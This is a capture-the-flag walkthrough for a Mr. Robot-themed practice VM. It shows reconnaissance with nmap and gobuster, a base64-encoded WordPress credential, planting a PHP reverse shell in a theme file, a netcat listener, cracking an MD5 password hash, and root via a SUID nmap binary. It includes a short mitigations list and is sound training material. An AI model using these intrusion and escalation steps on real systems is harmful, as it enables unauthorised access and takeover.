## Challenge Description

> Can you root this Mr. Robot styled machine? This is a virtual machine meant for beginners/intermediate users. There are 3 hidden keys located on the machine, can you find them?

This Mr. Robot-themed challenge tasks us with compromising a virtual machine modeled after the *fsociety* universe. The objective is to find three hidden keys located on the system.

The virtual machine for deployment and investigation is hosted at: `10.10.202.58`

## Goal

Locate all three hidden keys.

## TL;DR

- Ports 22, 80, 443 were discovered using `nmap`.
- The first flag was found in `robots.txt`
- Credentials were located in `license.txt`.
- Access was gained to the WordPress admin panel.
- A reverse shell was gained via theme edit.
- The second flag was found inside the `robot` home directory.
- The `robot` user was accessed after cracking the MD5 password and the second flag was retrieved.
- Privileges were escalated using the `nmap` SUID binary.
- The third flag was retrieved.

## Reconnaissance

### Port Scan

The enumeration phase begins with a full TCP port scan using `nmap`:

```bash
sudo nmap 10.10.202.58 -sV -p- -oA initial_scan
```

Key Results:

```bash
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     Apache httpd
443/tcp open  ssl/http Apache httpd
```

## Web Enumeration

### Initial Site Analysis

Navigating to http://10.10.202.58 reveals a minimal interface - just a prompt allowing predefined commands. After experimenting, nothing useful was discovered from this interface.

The next step is to enumerate potential hidden directories and files.

### Directory and File Brute-Force

`gobuster` is used to uncover file and directories:

```bash
gobuster dir -u http://10.10.202.58 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php
```

This reveals several interesting finds:

- `/login`: Leads to a WordPress login portal.
- `/license.txt`: Contains a hidden base64 encoded string.
- `/robots.txt`: Lists two files:
    - `fsocity.dic`: Dictionary file containing presumably usernames and passwords.
    - `key-1-of-3.txt`: File containing the first flag.

The flag file is accessible via http://10.10.202.58/key-1-of-3.txt

### Credential Discovery

Inspecting `license.txt`, the following base64-encoded string was found: `ZWxsaW90OkVSMjgtMDY1Mgo=`. Decoding it via [CyberChef](https://gchq.github.io/CyberChef) reveals a credential pair containing username and password.

## Exploitation

### Gaining Access to WordPress

Logging into WordPress is successful using the discovered credentials. Though no flags are directly visible in the dashboard, the ability to edit theme files provides an excellent attack vector.

### Reverse Shell Setup

The active theme, such as `twentyfifteen`, is selected and the `404.php` file is modified to include a PHP reverse shell payload generated from [revshells](https://www.revshells.com/).

`404.php` is modified, but any PHP file in the selected theme would have worked as long as it's editable via the WordPress dashboard and directly accessible in the browser.

The next step is to start a listener on the attacking machine:

```bash
nc -lvnp 4343
```

The reverse shell can be triggered by navigating to:

`http://10.10.202.58/wp-content/themes/twentyfifteen/404.php`

## Post-Exploitation

### Enumerate Users

After obtaining a reverse shell, the system is checked for user accounts by listing the contents of the `/home` directory:

```bash
ls -l /home
```

A `robot` user is discovered.

### Enumerate Robot's Home Directory

```bash
ls -la /home/robot
```

Results:

```bash
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt                                                                                                                                      
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5 
```

`key-2-of-3.txt` is not readable due to file permissions, but `password.raw-md5` is world-readable.

```bash
cat /home/robot/password.raw-md5
```

An MD5 hash of `robot's` password is obtained, which can be cracked using [CrackStation](https://crackstation.net/)

![Crack Station](images/crack-station.png)

After cracking the hash, switching to `robot` allows reading the second flag:

```bash
su robot
cat /home/robot/key-2-of-3.txt
```

## Privilege Escalation

### Check Sudo Rights

The next step is to check if the `robot` user has any elevated permissions using `sudo`:

```bash
sudo -l
```

The output shows that the `robot` user lacks `sudo` privileges, so an alternative method for privilege escalation is required.

### Enumerating SUID Binaries

SUID (Set User ID) is a special file permission that allows an executable to run with the privileges of the file owner, typically `root`. By identifying a SUID binary that supports command execution, it may be possible to exploit it for `root` access.

SUID binaries are enumerated with the following command:

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

One of the results shows:

```bash
-rwsr-xr-x 1 root root   17272 Jun 2  18:23 /usr/local/bin/nmap
```

`nmap` has the SUID permission set and it's owned by `root`.

### Exploit Nmap SUID for Shell

The [GTFOBins](https://gtfobins.github.io/) website is checked for a method to exploit `nmap`.

The page shows that `nmap` can be launched in interactive mode:

```bash
namp --interactive
```
Executing the following results in a root shell:

```bash
nmap> !sh
```

## Post-Exploitation

Upon checking the `/root` directory with the following command:

```bash
ls -la /root
```

The following file is found:

```bash
-r-------- 1 root root 33 Nov 13  2015 key-3-of-3.txt
```

Reading the file reveals the third and final flag:

```bash
cat /root/key-3-of-3.txt
```

## Conclusion

This CTF, inspired by Mr. Robot, effectively simulated real-world exploitation techniques, with a focus on enumeration, privilege escalation, and web application exploitation. Through careful reconnaissance, crucial paths and credentials were discovered, leading to successful exploitation of the WordPress admin panel. After gaining initial access, user switching and privilege escalation were achieved using common techniques such as cracking MD5 hash and leveraging and SUID-enabled binary. Ultimately, the challenge demonstrated a comprehensive workflow from reconnaissance to privilege escalation, culminating in the retrieval of all three flags.

## Skills Practiced

- Directory and file enumeration using `gobuster`.
- Base64 decoding and credential extraction.
- Reverse shell creation and listener setup.
- Privilege escalation via SUID misconfiguration.

## Mitigations

- Never leave sensitive credentials or base64 data in public files.
- Avoid SUID on binaries like `nmap` that can be abused for shell access.

## Final Thoughts

This room was an excellent blend of web exploitation and privilege escalation. Itâ€™s beginner-friendly yet teaches critical real-world techniques - perfect for CTF practice and foundational pentesting skills.
